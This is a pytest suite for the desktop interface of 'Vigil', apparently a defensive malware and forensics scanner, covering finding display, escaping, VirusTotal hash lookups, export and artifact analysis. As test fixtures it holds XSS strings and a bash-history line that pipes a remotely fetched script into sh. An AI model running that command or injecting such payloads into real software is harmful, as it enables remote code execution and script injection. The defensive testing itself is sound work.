"""Interface (PySide6, modo offscreen). As configurações vão para um .ini temporário: nada toca o registro real."""
import os

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

import pytest

pytest.importorskip("PySide6")
from PySide6.QtCore import QSettings, Qt
from PySide6.QtWidgets import QApplication, QMessageBox

from vigil import core, forensics, gui, intel, state


@pytest.fixture(scope="session")
def app(tmp_path_factory):
    QSettings.setDefaultFormat(QSettings.IniFormat)
    QSettings.setPath(QSettings.IniFormat, QSettings.UserScope, str(tmp_path_factory.mktemp("qsettings")))
    return QApplication.instance() or QApplication([])


@pytest.fixture
def win(app, tmp_path, monkeypatch):
    monkeypatch.setattr(core, "data_dir", lambda: tmp_path / "dados")
    for k in ("ABUSECH_AUTH_KEY", "VT_API_KEY"):
        monkeypatch.delenv(k, raising=False)
    QSettings("Vigil", "Vigil").clear()
    w = gui.MainWindow()
    yield w
    w.close()
    w.deleteLater()


def drain(app, *owners):
    for o in owners:
        gui.wait_workers(o, 10000)
    for _ in range(5):
        app.processEvents()


def dialogs(monkeypatch, resposta=QMessageBox.Yes):
    """Substitui as caixas de diálogo e devolve as mensagens mostradas."""
    msgs = {"question": [], "information": [], "warning": []}
    for nome in msgs:
        def fake(*a, _n=nome, **k):
            msgs[_n].append(a[2] if len(a) > 2 else "")
            return resposta if _n == "question" else QMessageBox.Ok
        monkeypatch.setattr(QMessageBox, nome, staticmethod(fake))
    return msgs


def achado(where, score=60, **k):
    return {"type": "file", "where": where, "score": score, "level": core.level(score), "reasons": ["motivo"],
            "attack": [], "sha256": "ab" * 32, **k}


def selecionar(win, where):
    t = win.results.table
    for r in range(t.rowCount()):
        if t.item(r, 2).text() == where:
            t.selectRow(r)
            return
    raise AssertionError(f"linha não encontrada: {where}")


def mostrar(win, *achados, **extra):
    win.results.set_report({"findings": list(achados), "notes": [], "files_scanned": 1, "ignored": [], "new": 0, **extra})


# ------------------------------------------------------------ estrutura
def test_janela_tem_os_modulos_e_as_colunas(win):
    assert win.scan.cb_for.isChecked() and win.scan.cb_files.isChecked()
    t = win.results.table
    assert [t.horizontalHeaderItem(i).text() for i in range(t.columnCount())] == \
        ["Gravidade", "Tipo", "Local", "ATT&CK", "Pontos", "Novo"]
    assert win.acceptDrops()


def test_chaves_de_api_ficam_mascaradas(win):
    from PySide6.QtWidgets import QLineEdit
    assert win.sett.abuse_key.echoMode() == QLineEdit.Password and win.sett.vt_key.echoMode() == QLineEdit.Password


# ------------------------------------------------------------ resultados: novo / filtro / detalhes
def test_coluna_novo_e_filtro(win):
    mostrar(win, achado("A", new=True), achado("B", new=False), achado("C", new=None), new=1)
    t = win.results.table
    novos = {t.item(r, 2).text(): t.item(r, 5).text() for r in range(3)}
    assert novos == {"A": "●", "B": "", "C": ""} and "1 novos" in win.results.summary.text()
    win.results.cb_new.setChecked(True)
    assert [t.item(r, 2).text() for r in range(3) if not t.isRowHidden(r)] == ["A"]
    win.results.cb_new.setChecked(False)
    assert not any(t.isRowHidden(r) for r in range(3))


def test_detalhes_mostram_confianca_alvo_e_historico(win):
    mostrar(win, achado("X", trust={"label": "assinatura digital válida (Acme)"},
                        target={"path": "C:\\a\\b.exe", "sha256": "cd" * 32}, new=False, first_seen="2026-01-01T10:00:00"))
    selecionar(win, "X")
    txt = win.results.details.toPlainText()
    assert "assinatura digital válida (Acme)" in txt and "C:\\a\\b.exe" in txt and "já visto em 2026-01-01" in txt


def test_detalhes_escapam_conteudo_do_atacante(win):
    mostrar(win, achado("<script>alert(1)</script>.exe", reasons=["<img src=x onerror=1>"], detail="<b>x</b>"))
    selecionar(win, "<script>alert(1)</script>.exe")
    html = win.results.details.toHtml()
    assert "<script" not in html.lower() and "<img" not in html.lower()
    assert "<img src=x onerror=1>" in win.results.details.toPlainText()  # aparece como texto, não como marcação


# ------------------------------------------------------------ ignorar
def test_ignorar_achado(win, app, monkeypatch):
    msgs = dialogs(monkeypatch)
    mostrar(win, achado("A"), achado("B"))
    selecionar(win, "A")
    win.results.b_ign.click()
    assert [i["where"] for i in state.list_ignored()] == ["A"]
    assert win.results.table.rowCount() == 1 and [f["where"] for f in win.results.report["findings"]] == ["B"]
    assert len(win.results.report["ignored"]) == 1 and "1 ignorados" in win.results.summary.text()
    assert win.sett.ignored_list.count() == 1  # a página de Configurações foi atualizada
    assert msgs["question"]


def test_ignorar_recusado_nao_faz_nada(win, monkeypatch):
    dialogs(monkeypatch, QMessageBox.No)
    mostrar(win, achado("A"))
    selecionar(win, "A")
    win.results.b_ign.click()
    assert state.list_ignored() == [] and win.results.table.rowCount() == 1


def test_desfazer_ignorado_em_configuracoes(win):
    state.ignore(achado("A"))
    win.sett.refresh_ignored()
    win.sett.ignored_list.setCurrentRow(0)
    win.sett.unignore()
    assert state.list_ignored() == [] and win.sett.ignored_list.count() == 0


# ------------------------------------------------------------ VirusTotal (só com confirmação, só o hash)
def test_virustotal_sem_chave_nao_consulta(win, monkeypatch):
    msgs = dialogs(monkeypatch)
    monkeypatch.setattr(intel, "vt_lookup", lambda *a: pytest.fail("não deveria consultar"))
    mostrar(win, achado("A"))
    selecionar(win, "A")
    win.results.b_vt.click()
    assert any("chave" in m.lower() for m in msgs["information"])


def test_virustotal_recusado_nao_envia_nada(win, monkeypatch):
    dialogs(monkeypatch, QMessageBox.No)
    win.settings.setValue("vt_key", "k")
    monkeypatch.setattr(intel, "vt_lookup", lambda *a: pytest.fail("não deveria consultar"))
    mostrar(win, achado("A"))
    selecionar(win, "A")
    win.results.b_vt.click()


def test_virustotal_confirma_e_mostra_o_resultado(win, app, monkeypatch):
    msgs = dialogs(monkeypatch)
    win.settings.setValue("vt_key", "chave-do-usuario")
    visto = []
    monkeypatch.setattr(intel, "vt_lookup", lambda sha, key: visto.append((sha, key)) or
                        {"status": "found", "malicious": 5, "suspicious": 1, "harmless": 0, "undetected": 60,
                         "link": "https://www.virustotal.com/gui/file/x", "message": ""})
    mostrar(win, achado("A", sha256="ef" * 32))
    selecionar(win, "A")
    win.results.b_vt.click()
    drain(app, win.results)
    assert visto == [("ef" * 32, "chave-do-usuario")]
    assert "ef" * 32 in msgs["question"][0] and "nunca o arquivo" in msgs["question"][0]
    assert "5 malicioso" in win.results.details.toPlainText()


def test_virustotal_erro_aparece_sem_travar(win, app, monkeypatch):
    dialogs(monkeypatch)
    win.settings.setValue("vt_key", "k")

    def boom(*a):
        raise intel.IntelError("sem rede")

    monkeypatch.setattr(intel, "vt_lookup", boom)
    mostrar(win, achado("A"))
    selecionar(win, "A")
    win.results.b_vt.click()
    drain(app, win.results)
    assert "sem rede" in win.results.details.toPlainText()


def test_virustotal_usa_o_hash_do_binario_referenciado(win):
    mostrar(win, {"type": "persistence", "where": "Run\\X", "score": 50, "level": "MÉDIO", "reasons": ["r"], "attack": [],
                  "target": {"path": "C:\\a.exe", "sha256": "12" * 32}})
    selecionar(win, "Run\\X")
    assert win.results.b_vt.isEnabled()
    mostrar(win, {"type": "process", "where": "PID 1 x", "score": 50, "level": "MÉDIO", "reasons": ["r"], "attack": []})
    selecionar(win, "PID 1 x")
    assert not win.results.b_vt.isEnabled()  # sem hash, sem consulta


# ------------------------------------------------------------ exportação
@pytest.mark.parametrize("filtro,sufixo,marca", [
    ("Relatório JSON (*.json)", ".json", '"findings"'),
    ("Relatório HTML (*.html)", ".html", "<!doctype html"),
    ("Achados em CSV (*.csv)", ".csv", "Gravidade"),
    ("Linha do tempo em CSV (*.timeline.csv)", ".timeline.csv", "Quando"),
])
def test_exportar_cada_formato(win, tmp_path, monkeypatch, filtro, sufixo, marca):
    mostrar(win, achado("A", when="2026-01-01T10:00:00"))
    monkeypatch.setattr(gui.QFileDialog, "getSaveFileName", staticmethod(lambda *a, **k: (str(tmp_path / "saida"), filtro)))
    win.results.export()
    arq = tmp_path / ("saida" + sufixo)
    assert arq.exists() and marca.lower() in arq.read_text(encoding="utf-8-sig").lower()


def test_exportar_html_escapa_o_conteudo(win, tmp_path, monkeypatch):
    mostrar(win, achado("<script>alert(1)</script>"))
    monkeypatch.setattr(gui.QFileDialog, "getSaveFileName",
                        staticmethod(lambda *a, **k: (str(tmp_path / "r.html"), "Relatório HTML (*.html)")))
    win.results.export()
    assert "<script>alert(1)" not in (tmp_path / "r.html").read_text(encoding="utf-8")


def test_exportar_cancelado_nao_grava(win, tmp_path, monkeypatch):
    mostrar(win, achado("A"))
    monkeypatch.setattr(gui.QFileDialog, "getSaveFileName", staticmethod(lambda *a, **k: ("", "")))
    win.results.export()
    assert not list(tmp_path.glob("*.json"))


# ------------------------------------------------------------ alvos: arquivo avulso, arrastar e soltar, argv
def test_abrir_com_aponta_a_varredura_para_o_arquivo(win, tmp_path):
    f = tmp_path / "suspeito.exe"
    f.write_text("x")
    win.open_paths([str(f), str(tmp_path / "nao_existe")])
    assert [win.scan.targets.item(i).text() for i in range(win.scan.targets.count())] == [str(f)]
    assert win.scan.cb_files.isChecked() and not any(c.isChecked() for c in (win.scan.cb_pers, win.scan.cb_proc, win.scan.cb_for))
    assert win.stack.currentIndex() == 0


def test_caminhos_inexistentes_sao_ignorados(win):
    antes = win.scan.targets.count()
    win.open_paths(["/nao/existe", ""])
    assert win.scan.targets.count() == antes and win.scan.cb_for.isChecked()


def test_arrastar_e_soltar(win, tmp_path):
    from PySide6.QtCore import QMimeData, QPointF, QUrl
    from PySide6.QtGui import QDropEvent
    f = tmp_path / "solto.bin"
    f.write_text("x")
    mime = QMimeData()
    mime.setUrls([QUrl.fromLocalFile(str(f))])
    ev = QDropEvent(QPointF(5, 5), Qt.CopyAction, mime, Qt.LeftButton, Qt.NoModifier)
    win.dropEvent(ev)
    assert win.scan.targets.count() == 1 and win.scan.targets.item(0).text() == str(f)


def test_main_com_argumentos(app, tmp_path, monkeypatch):
    monkeypatch.setattr(core, "data_dir", lambda: tmp_path / "dados")
    f = tmp_path / "a.exe"
    f.write_text("x")
    janelas = []
    monkeypatch.setattr(gui, "QApplication", type("A", (), {
        "instance": staticmethod(lambda: app)}))
    monkeypatch.setattr(app, "exec", lambda: 0)
    orig = gui.MainWindow
    monkeypatch.setattr(gui, "MainWindow", lambda: janelas.append(orig()) or janelas[-1])
    assert gui.main([str(f)]) == 0
    assert janelas[0].scan.targets.item(0).text() == str(f)
    janelas[0].close()


# ------------------------------------------------------------ varredura usa confiança e estado
def test_varredura_pede_confianca_e_baseline(win, app, monkeypatch, tmp_path):
    visto = {}
    monkeypatch.setattr(core, "run_scan", lambda **k: visto.update(k) or
                        {"findings": [], "notes": [], "files_scanned": 0, "cancelled": False, "ignored": [], "new": 0})
    dialogs(monkeypatch)
    win.scan.toggle()
    win.scan.worker.wait(10000)
    app.processEvents()
    assert visto["check_trust"] is True and visto["track"] is True
    assert set(visto["modules"]) == {"files", "persistence", "processes", "forensics"}
    assert win.stack.currentIndex() == 1  # abriu os resultados


# ------------------------------------------------------------ artefato exportado
def test_analisar_artefato_exportado(win, app, tmp_path, monkeypatch):
    f = tmp_path / ".bash_history"
    f.write_text("curl http://x/a.sh | sh\n")
    monkeypatch.setattr(gui.QFileDialog, "getOpenFileName", staticmethod(lambda *a, **k: (str(f), "")))
    win.scan.analyze_artifact()
    drain(app, win.scan)
    assert win.stack.currentIndex() == 1 and win.results.table.rowCount() == 1
    assert win.results.table.item(0, 1).text() == "Artefato"


def test_analisar_artefato_com_erro_mostra_aviso(win, app, tmp_path, monkeypatch):
    msgs = dialogs(monkeypatch)
    monkeypatch.setattr(gui.QFileDialog, "getOpenFileName", staticmethod(lambda *a, **k: (str(tmp_path / "x"), "")))
    monkeypatch.setattr(forensics, "analyze_artifact_file", lambda p: (_ for _ in ()).throw(OSError("ilegível")))
    win.scan.analyze_artifact()
    drain(app, win.scan)
    assert any("ilegível" in m for m in msgs["warning"]) and win.scan.btn_art.isEnabled()


# ------------------------------------------------------------ inteligência (sempre com confirmação)
def test_atualizar_hashes_sem_chave_nao_acessa_a_rede(win, monkeypatch):
    msgs = dialogs(monkeypatch)
    monkeypatch.setattr(intel, "update_hashes", lambda **k: pytest.fail("não deveria acessar a rede"))
    win.sett.b_up_hash.click()
    assert any("Auth-Key" in m for m in msgs["information"])


def test_atualizar_hashes_recusado_nao_acessa_a_rede(win, monkeypatch):
    dialogs(monkeypatch, QMessageBox.No)
    win.settings.setValue("abusech_key", "k")
    win.sett.abuse_key.setText("k")
    monkeypatch.setattr(intel, "update_hashes", lambda **k: pytest.fail("não deveria acessar a rede"))
    win.sett.b_up_hash.click()


def test_atualizar_hashes_ativa_a_lista(win, app, tmp_path, monkeypatch):
    msgs = dialogs(monkeypatch)
    win.sett.abuse_key.setText("chave")
    lista = tmp_path / "h.txt"
    visto = {}
    monkeypatch.setattr(intel, "update_hashes", lambda auth_key=None, **k: visto.update(key=auth_key) or
                        {"count": 7, "path": str(lista), "source": "s", "date": "d"})
    win.sett.b_up_hash.click()
    drain(app, win.sett)
    assert visto["key"] == "chave" and win.sett.hashes.text() == str(lista)
    assert win.settings.value("hashes") == str(lista) and any("7 hashes" in m for m in msgs["information"])
    assert win.sett.b_up_hash.isEnabled()


def test_atualizar_hashes_com_erro_reabilita_o_botao(win, app, monkeypatch):
    msgs = dialogs(monkeypatch)
    win.sett.abuse_key.setText("k")

    def boom(**k):
        raise intel.IntelError("servidor recusou")

    monkeypatch.setattr(intel, "update_hashes", boom)
    win.sett.b_up_hash.click()
    drain(app, win.sett)
    assert any("servidor recusou" in m for m in msgs["warning"]) and win.sett.b_up_hash.isEnabled()


def test_chave_nao_vai_para_mensagens_nem_status(win, monkeypatch):
    win.sett.abuse_key.setText("SEGREDO-123")
    win.sett.refresh_intel()
    assert "SEGREDO-123" not in win.sett.intel_status.text()


def test_atualizar_yara_ativa_a_pasta(win, app, tmp_path, monkeypatch):
    if core.yara is None:
        pytest.skip("yara-python não instalado")
    msgs = dialogs(monkeypatch)
    pasta = tmp_path / "dados" / "intel" / "yara"
    pasta.mkdir(parents=True)
    monkeypatch.setattr(intel, "update_yara", lambda: {"files": 3, "skipped": ["x.yar: usa `include`"], "errors": ["y.yar: erro"]})
    win.sett.b_up_yara.click()
    drain(app, win.sett)
    assert win.sett.yara.text() == str(pasta) and any("3 regras aceitas, 2 descartadas" in m for m in msgs["information"])


# ------------------------------------------------------------ fechamento
def test_fechar_espera_as_tarefas_em_segundo_plano(win, app, monkeypatch):
    import time
    fim = []
    gui.run_async(win.sett, lambda: (time.sleep(0.3), fim.append(1)), lambda r, e: None)
    win.close()
    assert fim == [1]  # o fechamento esperou a tarefa terminar
